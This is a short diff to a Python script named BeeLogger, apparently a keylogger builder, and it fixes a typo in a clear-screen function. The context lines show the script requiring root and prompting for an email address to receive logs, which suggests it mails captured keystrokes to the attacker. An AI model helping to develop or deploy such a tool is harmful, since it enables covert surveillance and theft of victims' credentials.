@@ -10,7 +10,7 @@ import time
 if not os.geteuid() == 0:
     sys.exit('BeeLogger must be run as root')
 def clear():
-    os.sytem('clear')
+    os.system('clear')
 def begin():
     os.system('sudo rm -Rf dist')
     email = raw_input('Type your email to receive logs: ')
